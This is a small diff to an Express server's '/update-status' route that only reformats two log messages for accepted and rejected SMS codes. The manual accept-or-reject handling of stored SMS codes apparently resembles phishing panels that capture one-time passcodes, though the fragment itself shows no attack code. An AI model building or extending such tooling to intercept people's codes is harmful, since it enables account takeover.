@@ -570,10 +570,10 @@ app.post("/update-status", (req, res) => {
       pendingSMS[identifier].status = status;
       if (status === "sms_accept") {
         const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`✅ ${smsCode} SMS <b>Accepted</b>!`);
+        console.log(`💬 <code>${smsCode}</code> SMS Accepted!✅`);
       } else if (status === "sms_reject") {
         const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`❌ ${smsCode} SMS <b>Rejected</b>!`);
+        console.log(`💬 <code>${smsCode}</code> SMS Rejected!❌`);
       }
       return res.json({ ok: true });
     }
